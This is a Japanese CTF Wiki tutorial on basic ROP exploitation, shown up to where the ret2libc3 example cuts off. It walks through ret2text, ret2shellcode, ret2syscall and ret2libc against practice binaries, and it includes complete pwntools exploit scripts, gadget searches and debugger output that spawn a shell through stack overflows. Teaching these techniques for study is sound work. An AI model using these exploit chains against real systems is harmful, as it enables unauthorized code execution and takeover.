# 基本 ROP

NX(Non-eXecutable)保護が有効になると、従来のようにスタックやヒープに直接コードを注入する方法では効果が出にくくなりました。そこで攻撃者たちは、保護を回避するための対応する手法を考案しました。

現在広く使われている攻撃手法は**ROP(Return Oriented Programming、リターン指向プログラミング)**です。その主な考え方は、**スタックバッファオーバーフローを土台として、プログラム中にすでにある小さな断片(gadget)を利用してレジスタや変数の値を変え、プログラムの実行フローを制御する**というものです。

gadget は通常 `ret` で終わる命令列です。このような命令列を使うことで、プログラムの制御フローを何度も乗っ取り、特定の命令列を実行して攻撃の目的を達成できます。

リターン指向プログラミングという名前は、命令セット中の ret 命令を核として利用し、命令フローの実行順序を変え、複数の gadget を通じて新しいプログラムを「実行」することに由来します。

ROP 攻撃を行うには、一般に次の条件を満たす必要があります。

- プログラムの脆弱性によって制御フローを乗っ取り、その後の戻りアドレスを制御できること。

- 条件を満たす gadget と、対応する gadget のアドレスを見つけられること。

基本的な攻撃手段として、ROP 攻撃はスタックオーバーフローに限らず、ヒープオーバーフローなどさまざまな脆弱性の利用にも広く使われています。

なお、現代のオペレーティングシステムは通常アドレスのランダム化保護(ASLR)を有効にしており、これは gadget のメモリ上の位置が固定でないことが多いことを意味します。しかし幸い、対応するセグメントのベースアドレスからのオフセットは通常固定されています。そのため、適切な gadget を見つけた後、他の方法でプログラムの実行環境の情報をリークさせ、gadget の実際のメモリ上のアドレスを計算できます。

## ret2text

### 原理

ret2text とは、プログラム自身にすでにあるコード(つまり `.text` セグメント内のコード)を実行するよう制御することです。実のところ、この攻撃手法は大まかな言い方です。プログラムにすでにあるコードを実行させるとき、互いに隣り合っていない複数のコード断片(つまり gadget)を実行させることもできます。これが私たちが言う ROP です。

このとき、戻り先のコードの位置を知る必要があります。もちろん、プログラムが何らかの保護を有効にしている場合もあり、その保護を回避する方法を考える必要があります。

### 例

実は、スタックオーバーフローの基本原理の章ですでにこの単純な攻撃を紹介しました。ここではもう1つ、bamboofox が ROP を紹介する際に使った ret2text の例を挙げます。

> ダウンロードはこちら: [ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text)

まず、プログラムの保護機構を確認します。

```shell
➜  ret2text checksec ret2text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

プログラムは 32 ビットで、スタックの実行不可保護のみが有効になっていることが分かります。次に IDA でこのプログラムを逆コンパイルします。

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&v4);
  printf("Maybe I will tell you next time !");
  return 0;
}
```

メイン関数で gets 関数が使われており、明らかにスタックオーバーフロー脆弱性があります。次に逆アセンブルコードを見ます。

```asm
.text:080485FD secure          proc near
.text:080485FD
.text:080485FD input           = dword ptr -10h
.text:080485FD secretcode      = dword ptr -0Ch
.text:080485FD
.text:080485FD                 push    ebp
.text:080485FE                 mov     ebp, esp
.text:08048600                 sub     esp, 28h
.text:08048603                 mov     dword ptr [esp], 0 ; timer
.text:0804860A                 call    _time
.text:0804860F                 mov     [esp], eax      ; seed
.text:08048612                 call    _srand
.text:08048617                 call    _rand
.text:0804861C                 mov     [ebp+secretcode], eax
.text:0804861F                 lea     eax, [ebp+input]
.text:08048622                 mov     [esp+4], eax
.text:08048626                 mov     dword ptr [esp], offset unk_8048760
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system
```

secure 関数に `system("/bin/sh")` を呼び出すコードがあることが分かりました。したがって、プログラムを直接 `0x0804863A` に戻るよう制御できれば、システムの shell が得られます。

次に payload をどう組み立てるかですが、まず確定すべきなのは、制御できるメモリの先頭アドレスから main 関数の戻りアドレスまでのバイト数です。

```asm
.text:080486A7                 lea     eax, [esp+1Ch]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets
```

この文字列は esp からの相対インデックスで参照されているため、デバッグが必要です。call のところにブレークポイントを置き、esp と ebp を確認すると次のようになります。

```shell
gef➤  b *0x080486AE
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
gef➤  r
There is something amazing here, do you know anything?

Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24	    gets(buf);
───────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebx   : 0x00000000
$ecx   : 0xffffffff
$edx   : 0xf7faf870  →  0x00000000
$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebp   : 0xffffcdc8  →  0x00000000
$esi   : 0xf7fae000  →  0x001b1db0
$edi   : 0xf7fae000  →  0x001b1db0
$eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>
```

esp は 0xffffcd40、ebp は 0xffffcdc8 で、s の esp からの相対インデックスは `esp+0x1c` であることが分かります。したがって、次のように推測できます。

- s のアドレスは 0xffffcd5c
- s の ebp からのオフセットは 0x6c
- s の戻りアドレスからのオフセットは 0x6c+4

以上から、最終的な payload は次のようになります。

```python
##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline(b'A' * (0x6c + 4) + p32(target))
sh.interactive()
```

## ret2shellcode

### 原理

ret2shellcode とは、プログラムに shellcode を実行させるよう制御することです。shellcode とは、ある機能を実現するためのアセンブリコードのことで、よくある機能は主に対象システムの shell を取得することです。**通常、shellcode は自分で書く必要があります。つまりこの場合、メモリに実行可能なコードを自分で書き込む必要があります。**

スタックオーバーフローを土台に shellcode を実行するには、対応する binary の実行時に、shellcode のある領域に実行権限があることが必要です。

なお、**新しいカーネルでは比較的積極的な保護方針が導入され、プログラムには通常、書き込み可能かつ実行可能なセグメントがデフォルトでは存在しなくなりました。そのため、従来の ret2shellcode の手法では直接攻略できなくなっています。**

### 例

ここでは bamboofox の ret2shellcode を例にします。実験はカーネルのバージョンが古い環境(Ubuntu 18.04 以前など)で行う必要があることに注意してください。コンテナ環境同士は同じカーネルを共有するため、ここでは docker で環境を構築することはできません。

> ダウンロードはこちら: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode)

まず、プログラムで有効になっている保護を確認します。

```shell
➜  ret2shellcode checksec ret2shellcode
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

元のプログラムはほとんど保護が有効になっておらず、読み取り可能、書き込み可能、実行可能なセグメントがあることが分かります。次に IDA でプログラムを逆コンパイルします。

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&v4);
  strncpy(buf2, (const char *)&v4, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

プログラムは基本的なスタックオーバーフロー脆弱性のままですが、今回は対応する文字列を buf2 にもコピーしています。少し調べると、buf2 は bss セグメントにあることが分かります。

```asm
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
```

ここで、プログラムを簡単にデバッグして、この bss セグメントが実行可能かどうかを確認します。

```shell
gef➤  b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 

Breakpoint 1, main () at ret2shellcode.c:8
8	    setvbuf(stdout, 0LL, 2, 0LL);
─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
      6	 int main(void)
      7	 {
 →    8	     setvbuf(stdout, 0LL, 2, 0LL);
      9	     setvbuf(stdin, 0LL, 1, 0LL);
     10	 
─────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x8048536 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap 
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx 
0xf7fd3000 0xf7fd5000 0x00000000 rwx 
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx 
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
```

vmmap で、bss セグメントに対応するセグメントに実行権限があることが確認できます。

```text
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
```

そこで今回は、プログラムに shellcode を実行させるよう制御します。つまり shellcode を読み込み、プログラムを制御して bss セグメントにある shellcode を実行させます。対応するオフセットの計算は、ret2text の例と同様です。

最終的な payload は次のとおりです。

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
sh.interactive()
```

### もう1つの例

ここでは、`mprotect()` でメモリページの権限を動的に変更している ret2shellcode を例にします。これなら、Ubuntu-22.04 のような現代的なオペレーティングシステムでもこの実験ができる点に注意してください。

> ダウンロードはこちら: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-new/ret2shellcode)

まず、プログラムで有効になっている保護を確認します。

```shell
# zer0ptr @ DESKTOP-FHEMUHT in ~/Pwn-Research/ROP/ret2shellcode/wiki [21:14:26]
$ checksec ret2shellcode
[*] '/home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

元のプログラムはほとんど保護が有効になっておらず、読み取り可能、書き込み可能、実行可能なセグメントがあることが分かります。次に IDA でプログラムを逆コンパイルします。

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char src[104]; // [rsp+0h] [rbp-70h] BYREF
  void *addr; // [rsp+68h] [rbp-8h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  addr = (void *)((unsigned __int64)buf2 & -getpagesize());
  v3 = getpagesize();
  if ( mprotect(addr, v3, 7) >= 0 )
  {
    puts("No system for you this time !!!");
    printf("buf2 address: %p\n", buf2);
    gets(src);
    strncpy(buf2, src, 0x64u);
    printf("bye bye ~");
    return 0;
  }
  else
  {
    perror("mprotect failed");
    return 1;
  }
}
```

プログラムは基本的なスタックオーバーフロー脆弱性のままですが、今回は対応する文字列を buf2 にもコピーしています。少し調べると、buf2 は bss セグメントにあることが分かります。

```asm
.bss:00000000004040A0 buf2            db 68h dup(?)           ; DATA XREF: main+51↑o
.bss:00000000004040A0                                         ; main+A4↑o ...
```

ここで、プログラムを簡単にデバッグして、この bss セグメントが実行可能かどうかを確認します(mprotect で権限を変更しているので、当然 mprotect が呼ばれた後のアドレスにブレークポイントを置きます)。

```shell
pwndbg> b *0x401291
Breakpoint 1 at 0x401291
pwndbg> r
Starting program: /home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000000000401291 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
 RAX  0
 RBX  0
 RCX  0x7ffff7d1eb1b (mprotect+11) ◂— cmp rax, -0xfff
 RDX  7
 RDI  0x404000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x403e20 (_DYNAMIC) ◂— 1
 RSI  0x1000
 R8   0x7ffff7e1bf10 (initial+16) ◂— 4
 R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
 R10  0x7ffff7c082e0 ◂— 0xf0022000056ec
 R11  0x202
 R12  0x7fffffffde58 —▸ 0x7fffffffe0fd ◂— '/home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode'
 R13  0x401216 (main) ◂— endbr64
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011e0 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffdd40 ◂— 1
 RSP  0x7fffffffdcd0 ◂— 1
 RIP  0x401291 (main+123) ◂— test eax, eax
─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
 ► 0x401291 <main+123>    test   eax, eax     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
   0x401293 <main+125>  ✔ jns    main+149                    <main+149>
    ↓
   0x4012ab <main+149>    lea    rax, [rip + 0xd66]     RAX => 0x402018 ◂— 'No system for you this time !!!'
   0x4012b2 <main+156>    mov    rdi, rax               RDI => 0x402018 ◂— 'No system for you this time !!!'
   0x4012b5 <main+159>    call   puts@plt                    <puts@plt>

   0x4012ba <main+164>    lea    rax, [rip + 0x2ddf]     RAX => 0x4040a0 (buf2)
   0x4012c1 <main+171>    mov    rsi, rax                RSI => 0x4040a0 (buf2)
   0x4012c4 <main+174>    lea    rax, [rip + 0xd6d]      RAX => 0x402038 ◂— 'buf2 address: %p\n'
   0x4012cb <main+181>    mov    rdi, rax                RDI => 0x402038 ◂— 'buf2 address: %p\n'
   0x4012ce <main+184>    mov    eax, 0                  EAX => 0
   0x4012d3 <main+189>    call   printf@plt                  <printf@plt>
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdcd0 ◂— 1
01:0008│-068 0x7fffffffdcd8 ◂— 1
02:0010│-060 0x7fffffffdce0 —▸ 0x400040 ◂— 0x400000006
03:0018│-058 0x7fffffffdce8 —▸ 0x7ffff7fe283c (_dl_sysdep_start+1020) ◂— mov rax, qword ptr [rsp + 0x58]
04:0020│-050 0x7fffffffdcf0 ◂— 0x6f0
05:0028│-048 0x7fffffffdcf8 —▸ 0x7fffffffe0d9 ◂— 0xb0ec6c6b3dbd55d3
06:0030│-040 0x7fffffffdd00 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
07:0038│-038 0x7fffffffdd08 ◂— 0x10101000000
────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► 0         0x401291 main+123
   1   0x7ffff7c29d90 __libc_start_call_main+128
   2   0x7ffff7c29e40 __libc_start_main+128
   3         0x401155 _start+37
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x401000 r--p     1000       0 ret2shellcode
          0x401000           0x402000 r-xp     1000    1000 ret2shellcode
          0x402000           0x403000 r--p     1000    2000 ret2shellcode
          0x403000           0x404000 r--p     1000    2000 ret2shellcode
          0x404000           0x405000 rwxp     1000    3000 ret2shellcode
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000  1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e15000     0x7ffff7e16000 ---p     1000  215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e16000     0x7ffff7e1a000 r--p     4000  215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000  219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000       0 [anon_7ffff7e1c]
    0x7ffff7fad000     0x7ffff7fb0000 rw-p     3000       0 [anon_7ffff7fad]
    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000       0 [anon_7ffff7fbb]
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000       0 [vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000       0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000    2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rwxp    21000       0 [stack]
```

ここでも同様に vmmap で、bss セグメントに対応するセグメントに実行権限があることが確認できます。

```text
0x404000           0x405000 rwxp     1000    3000 ret2shellcode
```

考え方は前の例と同じです。

最終的な payload は次のとおりです。

```python
#!/usr/bin/env python3
from pwn import *
context.binary = './ret2shellcode'
context.log_level = 'debug'
io = process('./ret2shellcode')

buf2_addr = 0x4040a0
shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(100, b'\x90')  
payload = payload.ljust(120, b'a')       
payload += p64(buf2_addr)                

io.sendline(payload)
io.interactive()
```

### 問題

- sniperoj-pwn100-shellcode-x86-64

## ret2syscall

### 原理

ret2syscall とは、プログラムにシステムコールを実行させるよう制御して、shell を得ることです。

### 例

ここでも bamboofox の ret2syscall を例にします。

> ダウンロードはこちら: [ret2syscall](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)

まず、プログラムで有効になっている保護を確認します。

```shell
➜  ret2syscall checksec rop
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

元のプログラムは 32 ビットで、NX 保護が有効になっていることが分かります。次に IDA で逆コンパイルします。

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

今回もスタックオーバーフローであることが分かります。前の方法と同様に、v4 の ebp からのオフセットが 108 であると分かります。したがって、上書きすべき戻りアドレスの v4 からのオフセットは 112 です。今回は、プログラム中のあるコードを直接利用することも、自分でコードを書き込んで shell を得ることもできないため、プログラム中の gadget を利用して shell を得ます。shell の取得にはシステムコールを使います。システムコールの知識については、次を参照してください。

- https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8

簡単に言うと、shell を得るシステムコールの引数を対応するレジスタに入れておけば、int 0x80 を実行するだけで対応するシステムコールを実行できます。たとえばここでは、次のシステムコールで shell を得ます。

```C
execve("/bin/sh",NULL,NULL)
```

このプログラムは 32 ビットなので、次のようにする必要があります。

- システムコール番号、つまり eax は 0xb にする
- 第1引数、つまり ebx は /bin/sh のアドレスを指すようにする。実際には sh を実行するアドレスでも構いません。
- 第2引数、つまり ecx は 0 にする
- 第3引数、つまり edx は 0 にする

では、これらのレジスタの値をどう制御するのでしょうか。ここで gadget を使います。たとえば、いまスタックトップが 10 のとき、pop eax を実行すると eax の値は 10 になります。ただし、対応するレジスタをすべて同時に制御できる連続したコードがあるとは期待できないため、1つずつ制御する必要があります。これが、gadget の最後に ret を使って再びプログラムの実行フローを制御する理由でもあります。gadget を探す具体的な方法としては、ropgadgets というツールを使えます。

まず、eax を制御する gadget を探します。

```shell
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

上記のいくつかはどれも eax を制御できることが分かります。ここでは2番目を gadget として選びます。

同様に、他のレジスタを制御する gadget も得られます。

```shell
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

ここでは次のものを選びます。

```text
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

これは他の3つのレジスタを直接制御できます。

さらに、/bin/sh 文字列に対応するアドレスを得る必要があります。

```shell
➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh
```

対応するアドレスが見つかりました。さらに、int 0x80 のアドレスは次のとおりです。

```text
➜  ret2syscall ROPgadget --binary rop  --only 'int'                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
```

これで、対応するアドレスも見つかりました。

次が対応する payload です。0xb は execve に対応するシステムコール番号です。

```python
#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```

### 問題

## ret2libc

### 原理

ret2libc とは、関数の実行を libc 中の関数に制御することで、通常はある関数の plt に戻るか、関数の具体的な位置(つまり関数に対応する got テーブルエントリの内容)に戻ります。一般には system("/bin/sh") を実行することを選ぶので、system 関数のアドレスを知る必要があります。

### 例

易しいものから難しいものへ、3つの例を挙げます。

#### 例1

ここでは bamboofox の ret2libc1 を例にします。

> ダウンロードはこちら: [ret2libc1](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1)

まず、プログラムのセキュリティ保護を確認します。

```shell
➜  ret2libc1 checksec ret2libc1    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

元のプログラムは 32 ビットで、NX 保護が有効になっています。次にプログラムを逆コンパイルして、脆弱性の位置を特定します。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```

gets 関数の実行時にスタックオーバーフローが発生することが分かります。さらに ropgadget を使って、/bin/sh が存在するか確認できます。

```shell
➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
Strings information
============================================================
0x08048720 : /bin/sh
```

確かに存在します。次に、system 関数が存在するかも調べます。ida で調べたところ、これも確かに存在します。

```asm
.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]
```

そこで、ここに直接戻る、つまり system 関数を実行します。対応する payload は次のとおりです。

```python
#!/usr/bin/env python3
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat([b'a' * 112, system_plt, b'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

ここでは関数呼び出しスタックの構造に注意する必要があります。system 関数を通常どおり呼び出す場合、呼び出し時に対応する戻りアドレスがあります。ここでは `'bbbb'` をダミーのアドレスとし、その後ろに引数の内容を置いています。

この例は比較的簡単で、system のアドレスと /bin/sh のアドレスの両方が与えられていますが、ほとんどのプログラムはこれほど恵まれた状況ではありません。

#### 例2

ここでは bamboofox の ret2libc2 を例にします。

> ダウンロードはこちら: [ret2libc2](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc2/ret2libc2)

この問題は例1とほぼ同じですが、/bin/sh 文字列が登場しなくなったため、今回は自分で文字列を読み込む必要があります。そのため2つの gadget が必要です。1つ目はプログラムに文字列を読み込ませるもの、2つ目はプログラムに system("/bin/sh") を実行させるものです。脆弱性は上記と同じなので、ここでは詳しく述べません。具体的な exp は次のとおりです。

```python
#!/usr/bin/env python3
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    [b'a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
```

ここでは、プログラムの bss セグメントの buf2 に /bin/sh 文字列を書き込み、そのアドレスを system の引数として渡していることに注意してください。こうして shell を得られます。

#### 例3

ここでは bamboofox の ret2libc3 を例にします。

> ダウンロードはこちら: [ret2libc3](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3/ret2libc3)

例2をベースに、さらに system 関数のアドレスも取り除きます。このとき、system 関数のアドレスと /bin/sh 文字列のアドレスの両方を見つける必要があります。まず、セキュリティ保護を確認します。

```shell
➜  ret2libc3 checksec ret2libc3
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

元のプログラムではスタックの実行不可保護がやはり有効になっていることが分かります。さらにソースコードを見ると、プログラムのバグはやはりスタックオーバーフローです。

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
}
```

では、system 関数のアドレスをどう得るのでしょうか。ここで主に使うのは次の2つの知識です。

- system 関数は libc に属しており、libc.so 動的リンクライブラリ内の関数同士の相対オフセットは固定です。
